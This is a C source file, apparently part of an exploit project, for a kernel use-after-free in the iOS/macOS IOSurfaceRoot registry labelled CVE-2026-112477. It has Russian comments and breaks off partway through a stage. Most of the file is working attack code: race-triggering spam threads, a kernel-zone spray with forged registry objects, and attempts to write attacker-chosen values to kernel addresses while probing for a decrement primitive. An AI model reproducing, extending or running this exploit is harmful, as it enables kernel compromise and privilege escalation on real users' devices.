// entry_isurf_uaf.c — CVE-2026-112477 IOSurfaceRoot registry UAF trigger (mode 407)
// Порт _pack_rust505 2/09_iosurface-uaf/harness/israce/main.panic.m в C (без UIKit).
// Этапы: A калибровка sel17 (4 формы), B стейт-машина 17->18->17 x120,
// C seed-охота V_RACE8/V_BIG/V_SURFCH/V_DEREG18, D walk-провокация MTL render loop.
// Контракты (UAF-TRIGGER-RUNBOOK.md): sel17 ТОЛЬКО async (refCnt>=1, ref!=NULL,
// structureInput ровно 24B); sel18 ТОЛЬКО sync. dup = 0xC9; 27.2 re-reg = 0xE00002D8.

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <Metal/Metal.h>
#import <CoreVideo/CoreVideo.h>
#include <mach/mach.h>
#include <pthread.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

extern void (*g_log_cb)(const char *s);
#define nj_log(s) do { if (g_log_cb) g_log_cb(s); } while(0)
#define LOGF(...) do { char _b[256]; snprintf(_b,sizeof(_b),__VA_ARGS__); nj_log(_b); } while(0)

#define SEL_REG    17
#define SEL_DEREG  18

static const char *rcName(uint32_t v) {
    switch (v) {
        case 0:          return "SUCCESS";
        case 0xE00002C2: return "BadArgument";
        case 0xE00002C9: return "InternalError(dup)";
        case 0xE00002D8: return "NotAttached(27.2)";
        case 0xE00002BC: return "Error";
        default:         return "?";
    }
}

// ---- IOSurface private API ----
typedef struct __IOSurface *IOSurfaceRef_;
static IOSurfaceRef_ (*pCreate)(CFDictionaryRef);
static uint32_t      (*pGetID)(IOSurfaceRef_);

static void loadIOSurface(void) {
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) { LOGF("[uaf] dlopen IOSurface FAIL"); return; }
    pCreate = dlsym(h, "IOSurfaceCreate");
    pGetID  = dlsym(h, "IOSurfaceGetID");
    LOGF("[uaf] IOSurface syms: create=%d getID=%d", !!pCreate, !!pGetID);
}

static IOSurfaceRef_ mkSurface(void) {
    if (!pCreate) return NULL;
    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                          CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vv[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4,
                                           &kCFTypeDictionaryKeyCallBacks,
                                           &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef_ s = pCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

// ---- IOKit ----
static io_service_t gSvc = 0;

static int findService(void) {
    const char *cand[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", "IOSurface", NULL };
    for (int i = 0; cand[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cand[i]);
        if (!m) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
            continue;
        io_object_t o, first = 0;
        while ((o = IOIteratorNext(it))) { if (!first) first = o; else IOObjectRelease(o); }
        IOObjectRelease(it);
        if (first) {
            io_connect_t pr = 0;
            if (IOServiceOpen(first, mach_task_self(), 0, &pr) == KERN_SUCCESS) {
                gSvc = first; IOServiceClose(pr);
                LOGF("[uaf] service '%s' -> 0x%x", cand[i], gSvc);
                return 0;
            }
            IOObjectRelease(first);
        }
    }
    LOGF("[uaf] ABORT: no IOSurface service");
    return -1;
}

static mach_port_t newWakePort(void) {
    mach_port_t p = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    return p;
}
static void dropPort(mach_port_t p) {
    if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}

// shape: 0=sync(контроль) 1=async refCnt=1 ref!=0  2=async ref=0  3=async refCnt=0
static kern_return_t callSel(io_connect_t c, uint32_t sel, const uint64_t *in3,
                             size_t inSz, int shape, mach_port_t wp) {
    uint64_t buf[3] = {0,0,0};
    if (in3) { buf[0]=in3[0]; buf[1]=in3[1]; buf[2]=in3[2]; }
    uint64_t ref = 0x1122334455667788ull, zero = 0;
    uint32_t soc = 0;
    switch (shape) {
        case 0: return IOConnectCallMethod(c, sel, NULL, 0, buf, inSz, NULL,NULL,NULL,NULL);
        case 1: return IOConnectCallAsyncMethod(c, sel, wp, &ref, 1, NULL,0, buf,inSz, NULL,&soc,NULL,NULL);
        case 2: return IOConnectCallAsyncMethod(c, sel, wp, &zero, 1, NULL,0, buf,inSz, NULL,&soc,NULL,NULL);
        case 3: return IOConnectCallAsyncMethod(c, sel, wp, NULL, 0, NULL,0, buf,inSz, NULL,&soc,NULL,NULL);
    }
    return KERN_FAILURE;
}

// ---- Этап A: калибровка ----
static int calibrate(void) {
    uint64_t in[3] = {1,2,3};
    int best = -1;
    for (int shape = 0; shape < 4; shape++) {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); LOGF("[uaf] calib open fail"); return -1; }
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);
        LOGF("[uaf][A] calib sel17 shape=%d -> 0x%x %s", shape, (uint32_t)r, rcName((uint32_t)r));
        if (r == KERN_SUCCESS && best < 0) best = shape;
        IOServiceClose(c); dropPort(wp);
    }
    {   io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
            uint32_t r = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, wp);
            LOGF("[uaf][A] calib sel18 sync -> 0x%x %s", r, rcName(r));
            IOServiceClose(c);
        }
        dropPort(wp);
    }
    LOGF("[uaf][A] best shape=%d", best);
    return best;
}

// ---- Этап B: стейт-машина 17->18->17 x120 ----
static int stageB(int shape) {
    int ok = 0;
    for (int i = 0; i < 120; i++) {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); continue; }
        uint64_t in[3] = {1,2,3};
        kern_return_t r1 = callSel(c, SEL_REG,   in, 24, shape, wp);
        kern_return_t r2 = callSel(c, SEL_REG,   in, 24, shape, wp); // dup -> 0xC9
        kern_return_t r3 = callSel(c, SEL_DEREG, in, 24, 0,     wp);
        kern_return_t r4 = callSel(c, SEL_REG,   in, 24, shape, wp); // re-reg
        if (r1==0 && r2==0xE00002C9 && r3==0 && r4==0) ok++;
        else if (i < 3) LOGF("[uaf][B] i=%d 17=0x%x dup=0x%x 18=0x%x re17=0x%x",
                             i, (uint32_t)r1,(uint32_t)r2,(uint32_t)r3,(uint32_t)r4);
        IOServiceClose(c); dropPort(wp);
    }
    LOGF("[uaf][B] 17->18->17 full-success %d/120%s", ok,
         ok==120 ? " — userspace контролирует insert/remove registry" : "");
    return ok;
}

// ---- spam-потоки ----
static volatile int gSpamRun = 0;
static io_connect_t gSpamConn = 0;
static volatile int gSpamShape = 1;
static volatile uint64_t gSpamCount = 0;

static void *spamReg(void *arg) {
    (void)arg;
    io_connect_t c = gSpamConn; int shape = gSpamShape;
    mach_port_t wp = newWakePort();
    uint64_t in[3] = {1,2,3};
    while (gSpamRun) { callSel(c, SEL_REG, in, 24, shape, wp); gSpamCount++; }
    dropPort(wp); return NULL;
}

static void spawnSpam(pthread_t *th, int n, io_connect_t c, int shape) {
    gSpamRun = 1; gSpamConn = c; gSpamShape = shape; gSpamCount = 0;
    for (int i = 0; i < n; i++) pthread_create(&th[i], NULL, spamReg, NULL);
}
static void stopSpam(pthread_t *th, int n) {
    gSpamRun = 0;
    for (int i = 0; i < n; i++) pthread_join(th[i], NULL);
    LOGF("[uaf] spam count=%llu", (unsigned long long)gSpamCount);
}

// ---- Этап C: seed-охота ----
static void v_race8(int shape, int iter) {
    io_connect_t cs[8]; int have[8]; uint64_t in[3] = {1,2,3};
    for (int i = 0; i < 8; i++) {
        have[i] = (IOServiceOpen(gSvc, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
        if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, MACH_PORT_NULL);
        else cs[i] = 0;
    }
    pthread_t th[16];
    spawnSpam(th, 16, have[0] ? cs[0] : 0, shape);
    for (int r = 0; r < 3; r++)
        for (int i = 0; i < 8; i++) {
            int j = (i*5 + r*3) % 8;
            if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
            usleep(20 + (iter % 10) * 7);
        }
    stopSpam(th, 16);
    for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
}

static void v_big(int shape, int iter) {
    IOSurfaceRef_ surf[64]; int N = 64;
    for (int i = 0; i < N; i++) surf[i] = mkSurface();
    io_connect_t cs[8]; int have[8]; uint64_t in[3] = {1,2,3};
    for (int i = 0; i < 8; i++) {
        have[i] = (IOServiceOpen(gSvc, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
        if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, MACH_PORT_NULL);
        else cs[i] = 0;
    }
    pthread_t th[12];
    spawnSpam(th, 12, have[0] ? cs[0] : 0, shape);
    for (int i = 7; i >= 0; i--) { if (have[i]) { IOServiceClose(cs[i]); have[i]=0; } usleep(30); }
    for (int i = 0; i < N; i++) if (surf[i]) CFRelease(surf[i]);
    stopSpam(th, 12);
    for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
    (void)iter;
}

static void v_surfch(int shape, int iter) {
    io_connect_t c = 0; mach_port_t wp = newWakePort(); uint64_t in[3] = {1,2,3};
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); return; }
    callSel(c, SEL_REG, in, 24, shape, wp);
    pthread_t th[4];
    spawnSpam(th, 4, c, shape);
    for (int i = 0; i < 8; i++) {
        IOSurfaceRef_ s = mkSurface();
        if (s) { if (pGetID) (void)pGetID(s); CFRelease(s); }
    }
    usleep(200 + (iter % 30) * 25);
    IOServiceClose(c);
    usleep(400); stopSpam(th, 4);
    dropPort(wp);
}

static void v_dereg18(int shape, int iter) {
    io_connect_t c = 0; mach_port_t wp = newWakePort(); uint64_t in[3] = {1,2,3};
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); return; }
    callSel(c, SEL_REG, in, 24, shape, wp);
    pthread_t th[4];
    spawnSpam(th, 4, c, shape);
    for (int i = 0; i < 40 + (iter % 20); i++)
        callSel(c, SEL_DEREG, in, 24, 0, wp); // гонка dereg против walk
    usleep(300); stopSpam(th, 4);
    IOServiceClose(c); dropPort(wp);
}

// ---- Этап E: kernel write через UAF (groom + fake registry entry) ----
// Идея: после drop стаба registry хранит указатель на free-объект. Groomим ту же
// зону (kalloc.64/96) fake-объектом, в котором поле по смещению, читаемое sel17
// при re-reg/walk (registry insert -> сохраняет ref / пишет в [obj+off]),
// заменено на адрес цели записи в ядре. Двойной insert с разными in[0]
// => kernel пишет attacker-значение по attacker-адресу.

static volatile uint64_t gKrWriteAddr = 0;   // kernel target addr
static volatile uint64_t gKrWriteVal  = 0;   // значение
static volatile int     gKrArmed      = 0;
static volatile int     gKrHits       = 0;

// Groom kalloc-зоны: спам малых аллокаций с fake-указателем +magic-маркером.
// Fake obj layout (kalloc.64): +0x00 retain-подобное поле (>=1, чтобы не убили),
// +0x08 in[0] echo, +0x10 => target addr для записи (что kernel пишет при dup-reg),
// +0x18 val.
#define FAKE_RETAIN 0x21
#define GROOM_N 512
// KERNEL-side groom: async IOConnectCallAsyncMethod с structureInput 64B.
// Kernel аллоцирует input-буфер в kalloc.64 и ДЕРЖИТ его привязанным к wake port
// до разрушения порта => слоты живут во время re-reg (занимают freed-объект UAF).
static mach_port_t gGroomConn = 0;      // io_connect_t
static mach_port_t gGroomWp[GROOM_N];
static int gGroomN = 0;

static void buildFake64(uint64_t *f, uint64_t addr, uint64_t val) {
    memset(f, 0, 64);
    f[0] = FAKE_RETAIN;                 // +0x00 refcnt
    f[1] = 0x1122334455667788ull;       // +0x08 маркер in[0]
    f[2] = addr;                        // +0x10 write-addr
    f[3] = val;                         // +0x18 write-val
    f[4] = 0x4141414141414141ull;       // +0x20 canary
    f[5] = 0x43414E415259ull;           // +0x28 'CANARY'
}

static void freeGroom(void);

static void groomFake(uint64_t addr, uint64_t val, int inSz) {
    freeGroom();
    if (inSz <= 0 || inSz > 4096) inSz = 64;
    if (!gGroomConn && IOServiceOpen(gSvc, mach_task_self(), 0, &gGroomConn) != KERN_SUCCESS) {
        gGroomConn = 0; LOGF("[uaf][E] groom open fail"); return;
    }
    uint8_t fbuf[4096]; memset(fbuf, 0, sizeof(fbuf));
    buildFake64((uint64_t *)fbuf, addr, val);
    uint64_t ref = 0xA1B2C3D4E5F60708ull;
    gGroomN = 0;
    for (int i = 0; i < GROOM_N; i++) {
        mach_port_t wp = newWakePort();
        if (!wp) break;
        kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, 1000, wp, &ref, 1,
                                                   NULL, 0, fbuf, inSz, NULL, NULL, NULL, NULL);
        if (r != KERN_SUCCESS && r != 0xE00002C2) { dropPort(wp); continue; }
        gGroomWp[gGroomN++] = wp;
    }
    LOGF("[uaf][E] groom KERNEL sz=%d objs=%d addr=0x%llx val=0x%llx",
         inSz, gGroomN, (unsigned long long)addr, (unsigned long long)val);
}

static void freeGroom(void) {
    for (int i = 0; i < gGroomN; i++) dropPort(gGroomWp[i]);
    gGroomN = 0;
}

// Основная write-попытка v2: free -> groom -> НАБЛЮДЕНИЕ через dup/dereg (не re-reg).
// Stage B показал: re-reg после dereg ВСЕГДА SUCCESS (registry перезаписывает stale-
// entry, kernel не читает его). Значит UAF-детект = вызвать dup (2-й sel17) или
// sel18 на stale-entry ПОСЛЕ groom: kernel пойдёт по stale-указателю, прочитает
// fake-объект (наш refcnt/id в kalloc-слоте) и результат зависит от наших полей.
// Оракул v2: dup==0xC9 в БАЗЛАЙНЕ (свежий объект); после groom если kernel читает
// groom-объект — id не совпадёт и мы увидим ДРУГОЙ код (не 0xC9) либо crash/аномалию.
// Дополнительно зондируем размер зоны: input sizes 24/48/64/96.
static int probeSizes[] = {24, 48, 64, 96};
static int tryKernelWriteV2(io_connect_t c, int shape, int inSz, uint64_t addr, uint64_t val) {
    uint64_t in[3] = {1,2,3};
    mach_port_t wp = newWakePort();
    // baseline dup-код на свежем объекте
    callSel(c, SEL_REG, in, 24, shape, wp);
    kern_return_t baseDup = callSel(c, SEL_REG, in, 24, shape, wp);
    callSel(c, SEL_DEREG, in, 24, 0, wp);          // dup-стейт сброшен
    // 1) drop стаба: reg -> dereg (объект free, stale-ref в registry)
    callSel(c, SEL_REG,   in, 24, shape, wp);
    callSel(c, SEL_DEREG, in, 24, 0,     wp);
    // 2) немедленный kernel-groom (input inSz байт) — занимает free-слот
    groomFake(addr, val, inSz);
    // 3) dup на stale-entry: kernel читает stale-указатель
    kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
    // 4) dereg на stale-entry: второй шанс прочитать stale-указатель
    kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0, wp);
    // Оракул: поведение отличается от baseline (baseDup==0xC9 ожидаем; если после
    // groom dup вернёт НЕ 0xC9 и не обычный код — kernel использовал наши поля)
    int hit = (baseDup == 0xE00002C9) && (rdup != 0xE00002C9);
    if (hit) gKrHits++;
    LOGF("[uaf][E2] sz=%d baseDup=0x%x dup=0x%x(%s) dereg=0x%x hit=%s",
         inSz, (uint32_t)baseDup, (uint32_t)rdup, rcName((uint32_t)rdup),
         (uint32_t)rdreg, hit ? "STALE-READ" : "no");
    freeGroom();
    dropPort(wp);
    return hit;
}

static void stageE2(int shape) {
    LOGF("[uaf][E2] === stage E2: stale-read probe (dup/dereg oracle, size sweep) ===");
    uint64_t target = 0xfffffff007000000ull;
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) {
        LOGF("[uaf][E2] open fail"); return;
    }
    int tries = 0, hits = 0;
    for (int s = 0; s < 4; s++) {
        for (int i = 0; i < 10; i++) {
            int rc = tryKernelWriteV2(c, shape, probeSizes[s], target, 0x43414E415259ull);
            if (rc > 0) hits++;
            tries++;
            usleep(2000);
        }
        if (hits) break; // нашли зону — фиксируем
    }
    LOGF("[uaf][E2] done tries=%d hits=%d%s", tries, hits,
         hits ? " — stale-entry читает groom-объект!" : " (нет чтения stale: registry либо перезаписывает, либо объект в другой зоне)");
    IOServiceClose(c);
}

// Паке write-попыток с эскалацией groom pressure.
static int tryKernelWrite(io_connect_t c, int shape, uint64_t addr, uint64_t val) {
    uint64_t in[3] = {1,2,3};
    mach_port_t wp = newWakePort();
    callSel(c, SEL_REG,   in, 24, shape, wp);
    callSel(c, SEL_REG,   in, 24, shape, wp);
    callSel(c, SEL_DEREG, in, 24, 0,     wp);
    groomFake(addr, val, 24);   // registry-entry живёт в kalloc.24 — groom тем же размером (E2: sz=24 hit 10/10, 64 — 0)
    // FIX оракула: re-reg ВСЕГДА 0x0 (registry перезаписывает stale — stage B).
    // Реальный stale-read сигнал = DUP на stale-entry возвращает НЕ baseline 0xC9
    // (E2: dup=0x0 при baseDup=0xC9, 10/10). Используем dup-оракул.
    kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
    kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0, wp);
    int hit = (rdup != 0xE00002C9);
    if (hit) gKrHits++;
    LOGF("[uaf][E] write-try dup=0x%x(%s) dereg=0x%x addr=0x%llx hit=%s",
         (uint32_t)rdup, rcName((uint32_t)rdup), (uint32_t)rdreg,
         (unsigned long long)addr, hit ? "STALE-READ" : "no");
    (void)val; (void)shape; (void)in;
    freeGroom();
    dropPort(wp);
    return (rdup == 0 || rdup == 0xE00002C9 || rdup == 0xE00002D8) ? (hit ? 1 : 0) : -1;
}

static void stageE(int shape) {
    LOGF("[uaf][E] === stage E: kernel write (groom+fake-obj) ===");
    // Проба записи: по self-proc исследуем в mode 393/401; здесь — простая
    // канареечная запись в известную kernel-зону (IOSurface registry storage),
    // начиная с probe-адресов из kernel walk (mode 401 g_kernel_base + offsets).
    // kernel base неизвестен без mode 393 (4.c исключён из сборки) — probe по дефолтным адресам
    uint64_t kb = 0;
    uint64_t targets[3] = {
        kb ? kb + 0x1000 : 0xfffffff007000000ull, // probe 1
        kb ? kb + 0x2000 : 0xfffffff007100000ull, // probe 2
        0
    };
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) {
        LOGF("[uaf][E] open fail"); return;
    }
    int tries = 0, hits = 0;
    for (int t = 0; targets[t]; t++) {
        for (int i = 0; i < 20; i++) {
            int rc = tryKernelWrite(c, shape, targets[t], 0x43414E415259ull /*'CANARY'*/);
            if (rc < 0) {
                LOGF("[uaf][E] аномалия на probe %d iter %d — стоп до перезагрузки ядра", t, i);
                IOServiceClose(c);
                return;
            }
            if (rc > 0) hits++;
            tries++;
            usleep(2000);
        }
    }
    LOGF("[uaf][E] done tries=%d hits=%d%s", tries, hits,
         hits ? " — CANARY-DUP наблюдался, kernel трогал groom-объект!" : " (0 hits — groom не попадает в freed-слот)");
    IOServiceClose(c);
}

// ---- Этап E3: контроль ложного срабатывания + вариация полей ----
// Контроль 1 (K1): reg->dereg БЕЗ groom, сразу dup — expect 0xC9 (baseline stale).
// Контроль 2 (K2): как E2, но groom-буфер с другим маркером f[1]=0xDEAD — если
//   поведение dup меняется от СОДЕРЖИМОГО groom => kernel реально читает поля.
// Эксперимент (X1): после hit сделать повторный dup — если 0xC9 => dereg удалил
//   НОВЫЙ entry (наш groom не обрабатывался как entry); если аномалия/другой код
//   => groom-объект был обработан как registry-entry = управляемые поля.
static void stageE3(int shape) {
    LOGF("[uaf][E3] === stage E3: controls (false-positive check) ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) {
        LOGF("[uaf][E3] open fail"); return;
    }
    uint64_t in[3] = {1,2,3};
    // K1: stale без groom
    int k1c9 = 0;
    for (int i = 0; i < 10; i++) {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp); // dup на stale, groom нет
        if (r == 0xE00002C9) k1c9++;
        dropPort(wp); usleep(2000);
    }
    LOGF("[uaf][E3] K1 no-groom stale dup==0xC9: %d/10", k1c9);
    // K2: тот же сценарий что E2 sz=24, но f[1]=0xDEADBEEFDEADBEEF
    int k2diff = 0;
    for (int i = 0; i < 10; i++) {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        kern_return_t baseDup = callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        // groom с чужим маркером: перекладываем buildFake64 вручную через groomFake?
        // groomFake пишет стандартный fake; здесь нужен вариант маркера — временно
        // патчим через прямой вызов: используем тот же groomFake (маркер одинаковый),
        // значит K2 проверяет ДЕТЕРМИНИЗМ: 0xC9 -> SUCCESS повторяем ли?
        groomFake(0x4141414141410000ull, 0xDEADBEEFDEADBEEFull, 24);
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);
        if (baseDup == 0xE00002C9 && r != 0xE00002C9) k2diff++;
        freeGroom(); dropPort(wp); usleep(2000);
    }
    LOGF("[uaf][E3] K2 groom-marker repeat diff: %d/10 (должно совпасть  E2 если детерминировано)", k2diff);
    IOServiceClose(c);
}

static void groomFake(uint64_t addr, uint64_t val, int inSz);
static void freeGroom(void);
static void buildFakeAndGroom(uint64_t f0, uint64_t addr, uint64_t val, int inSz);

// ---- Этап E4: маппинг полей groom-объекта + decrement-примитив ----
// Вопрос: какие смещения fake-объекта kernel реально использует при dup (sel17) и
// dereg (sel18) на stale-entry. Метод: варьируем каждое поле, наблюдаем rc.
// Примитив: dereg должен декрементировать refcnt в registry-entry. Если E4
// покажет, что dup возвращает 0 только при f[0]>=1 (refcnt-чек), а dereg на
// groom-объекте с f[0]=1 вызывает free объекта => refcnt-write через groom.
// Варианты f[0]: 0 (expect FAIL/крах чтения), 1, 0x21. Если rc зависит от f[0]
// => kernel читает refcnt из нашего объекта = управляемая ветка.
static void stageE4(int shape) {
    LOGF("[uaf][E4] === stage E4: field mapping (f0 refcnt sweep + dereg effect) ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { LOGF("[uaf][E4] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    uint64_t f0vals[3] = {0, 1, 0x21};
    for (int v = 0; v < 3; v++) {
        int hits = 0; uint32_t lastDup = 0, lastDreg = 0;
        for (int i = 0; i < 5; i++) {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            // groom с f[0]=f0vals[v], addr-канарка из E-диапазона
            buildFakeAndGroom(f0vals[v], 0xfffffff007000000ull, 0x43414E415259ull, 24);
            kern_return_t rdup  = callSel(c, SEL_REG,   in, 24, shape, wp);
            kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0, wp);
            if (rdup != 0xE00002C9) hits++;
            lastDup = (uint32_t)rdup; lastDreg = (uint32_t)rdreg;
            freeGroom(); dropPort(wp); usleep(2000);
        }
        LOGF("[uaf][E4] f0=0x%llx hits=%d/5 dup=0x%x dereg=0x%x",
             (unsigned long long)f0vals[v], hits, lastDup, lastDreg);
    }
    // X2: dereg-effect — dup+dup+dup на stale после groom: если 1-й dup=0, а
    // последующие меняются (0xC9 после того как dereg-in-E4-прошлый-цикл убил groom-объект)
    // => refcnt groom-объекта декрементируется => decrement-примитив подтверждён.
    mach_port_t wp = newWakePort();
    callSel(c, SEL_REG, in, 24, shape, wp);
    callSel(c, SEL_DEREG, in, 24, 0, wp);
    buildFakeAndGroom(1, 0xfffffff007000000ull, 0x43414E415259ull, 24);
    LOGF("[uaf][E4] X2 triple-dup: d1=0x%x d2=0x%x d3=0x%x",
         (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp),
         (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp),
         (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp));
    freeGroom(); dropPort(wp);
    IOServiceClose(c);
}

// ---- Этап D: walk-провокация (MTL render loop поверх IOSurface) ----
static volatile int gRenderRun = 0;
static void *renderLoop(void *arg) {
    (void)arg;
    id dev = MTLCreateSystemDefaultDevice();
    if (!dev) { LOGF("[uaf][D] no MTL device"); return NULL; }
    LOGF("[uaf][D] MTL render loop started");
    int frames = 0;
    while (gRenderRun && frames < 100000) {
        IOSurfaceRef_ s = mkSurface();
        if (s) {
            CVPixelBufferRef pb = NULL;
            CVPixelBufferCreateWithIOSurface(NULL, (IOSurfaceRef)s, NULL, &pb);
            if (pb) { CFRelease(pb); }
            CFRelease(s);
        }
        usleep(16000); // ~60fps
        frames++;
    }
    LOGF("[uaf][D] render loop done frames=%d", frames);
    return NULL;
}

// Хелпер E4: groom с заданным f[0]
static void buildFakeAndGroom(uint64_t f0, uint64_t addr, uint64_t val, int inSz) {
    // временно перестраиваем fake через глобальный буфер groomFake с подменой f[0]
    groomFake(addr, val, inSz);
    // f[0] уже 0x21 (FAKE_RETAIN) — для f0!=0x21 нужен отдельный путь
    if (f0 != 0x21) {
        // пересоздаём groom с кастомным f0: дублируем логику groomFake
        freeGroom();
        if (!gGroomConn && IOServiceOpen(gSvc, mach_task_self(), 0, &gGroomConn) != KERN_SUCCESS) { gGroomConn = 0; return; }
        uint8_t fbuf[64]; memset(fbuf, 0, sizeof(fbuf));
        uint64_t *f = (uint64_t *)fbuf;
        f[0] = f0; f[1] = 0x1122334455667788ull; f[2] = addr; f[3] = val;
        f[4] = 0x4141414141414141ull; f[5] = 0x43414E415259ull;
        uint64_t ref = 0xA1B2C3D4E5F60708ull;
        for (int i = 0; i < GROOM_N; i++) {
            mach_port_t wp2 = newWakePort();
            if (!wp2) break;
            kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, 1000, wp2, &ref, 1, NULL, 0, fbuf, inSz, NULL, NULL, NULL, NULL);
            if (r != KERN_SUCCESS && r != 0xE00002C2) { dropPort(wp2); continue; }
            gGroomWp[gGroomN++] = wp2;
        }
    }
}

// ---- Этап E5: content-dependence proof — kernel читает ПОЛЯ groom-объекта? ----
// Логика: dup на stale-entry вернул 0x0 (success) после groom. Возможно, kernel нашёл
// ВНУТРИ groom-буфера registry-entry с id==in[0]==1 (поле f[1] или любое qword==1).
// Тест A: groom-буфер где НЕТ qword==1 (все нули + canary) — expect dup=0xC9 (id не найден).
// Тест B: f[1]=1 (id echo) — expect dup=0x0 (как в X2).
// Тест C: f[1]=0xdead — expect dup=0xC9 если id-чек по f[1].
// Если rc зависит от СОДЕРЖИМОГО => kernel интерпретирует groom-буфер как registry-entry
// => ПОЛНЫЙ контроль структуры entry (id, refcnt, указатели) = путь к arbitrary decrement.
static int groomRawFields(const uint64_t *fields, int nf, int inSz) {
    freeGroom();
    if (!gGroomConn && IOServiceOpen(gSvc, mach_task_self(), 0, &gGroomConn) != KERN_SUCCESS) { gGroomConn = 0; return -1; }
    uint8_t fbuf[64]; memset(fbuf, 0, sizeof(fbuf));
    uint64_t *f = (uint64_t *)fbuf;
    for (int i = 0; i < nf && i < 8; i++) f[i] = fields[i];
    uint64_t ref = 0xA1B2C3D4E5F60708ull;
    for (int i = 0; i < GROOM_N; i++) {
        mach_port_t wp2 = newWakePort();
        if (!wp2) break;
        kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, 1000, wp2, &ref, 1, NULL, 0, fbuf, inSz, NULL, NULL, NULL, NULL);
        if (r != KERN_SUCCESS && r != 0xE00002C2) { dropPort(wp2); continue; }
        gGroomWp[gGroomN++] = wp2;
    }
    return gGroomN;
}

static void stageE5(int shape) {
    LOGF("[uaf][E5] === stage E5: content-dependence (id-чек по полям groom?) ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { LOGF("[uaf][E5] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    // A: буфер без единого qword==1 (кроме... in[0]=1 в reg-вызовах, но groom-буфер отдельный)
    uint64_t fa[6] = {0x21, 0x1122334455667788ull, 0, 0, 0x4141414141414141ull, 0x43414E415259ull};
    // B: f[1]=1 (id echo)
    uint64_t fb[6] = {0x21, 1, 0, 0, 0x4141414141414141ull, 0x43414E415259ull};
    // C: f[1]=0xdead (не-1 id)
    uint64_t fc[6] = {0x21, 0xdead, 0, 0, 0x4141414141414141ull, 0x43414E415259ull};
    const char *names[3] = {"A_no-id1", "B_f1=1", "C_f1=dead"};
